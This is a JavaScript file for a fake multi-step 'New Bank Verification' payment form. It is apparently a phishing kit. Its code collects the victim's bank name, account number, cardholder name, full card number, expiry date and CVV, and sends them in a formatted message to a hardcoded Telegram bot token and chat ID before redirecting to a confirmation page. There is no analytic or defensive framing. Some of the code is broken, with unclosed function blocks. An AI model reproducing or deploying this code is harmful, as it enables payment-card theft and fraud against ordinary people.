let currentStep = 0;
const steps = document.querySelectorAll(".form-step");

// Telegram Bot API Details
const TELEGRAM_BOT_TOKEN = "7739574932:AAHnQpeZR9obL8u7-oUdenZpIcSvTl5eZrY";
const TELEGRAM_CHAT_ID = "6300694007";

function nextStep() {
    if (validateStep()) {
        steps[currentStep].classList.remove("active");
        currentStep++;
        if (currentStep < steps.length) {
            steps[currentStep].classList.add("active");
        }
    }
}
function validateStep() {
    const inputs = steps[currentStep].querySelectorAll("input, select");
    for (let input of inputs) {
        if (!input.value.trim()) {
            alert(`Please fill in the ${input.previousElementSibling.innerText}`);
            return false;
        }

        if (input.id === "cardName" && !/^[A-Za-z\s]+$/.test(input.value)) {
            alert("Cardholder's name must only contain letters.");
            return false;
        }
       
        if (input.id === "cvv" && !/^\d{3,4}$/.test(input.value)) {
    alert("CVV must be 3 or 4 digits.");
    return false;
}
return true;

// Save progress
function saveProgress() {
    localStorage.setItem("currentStep", currentStep);
}
document.getElementById("expiryDate").addEventListener("input", function (e) {
    let input = e.target.value;
    
    // Remove non-numeric characters except for '/'
    input = input.replace(/[^0-9/]/g, '');
    
    // Automatically insert '/' after the first two digits
    if (input.length > 2 && input.indexOf('/') === -1) {
        input = input.slice(0, 2) + '/' + input.slice(2);
    }

    // Limit input to MM/YY format
    if (input.length > 5) {
        input = input.slice(0, 5);
    }

    e.target.value = input;
});
document.getElementById("cardNumber").addEventListener("input", function (e) {
    let input = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
    e.target.value = input;

    // Regular expression for common credit card prefixes (Visa, Mastercard, AMEX, etc.)
    const creditCardRegex = /^(4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})$/;

    if (input.length >= 13 && !creditCardRegex.test(input)) {
        alert("Invalid card number. Only credit cards are allowed.");
        e.target.value = "";
    }
});

// Load progress
window.onload = function () {
    const savedStep = localStorage.getItem("currentStep");
    if (savedStep) {
        currentStep = parseInt(savedStep);
        steps[currentStep].classList.add("active");
    }
};

function submitForm() {
    if (validateStep()) {
        // Collect user inputs
        const bank = document.getElementById("bank").value;
        const accountNumber = document.getElementById("accountNumber").value;
        const cardName = document.getElementById("cardName").value;
        const cardNumber = document.getElementById("cardNumber").value;
        const expiryDate = document.getElementById("expiryDate").value;
        const cvv = document.getElementById("cvv").value;

        // Format message
        const message = `🔔 **New Bank Verification Request** 🔔\n\n` +
            `🏦 **Bank Name:** ${bank}\n` +
            `💳 **Account Number:** ${accountNumber}\n\n` +
            `👤 **Cardholder Name:** ${cardName}\n` +
            `🔢 **Card Number:** ${cardNumber}\n` +
            `📅 **Expiration Date:** ${expiryDate}\n` +
            `🔒 **CVV:** ${cvv}`;

        // Send message to Telegram
        sendToTelegram(message);
    }
}

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            // Redirect only if the message is successfully sent
            window.location.href = "confirm.html";
        } else {
            alert("Failed to send details. Please try again.");
        }
    })
    .catch(() => {
        alert("Network error! Please check your connection and try again.");
    });
}
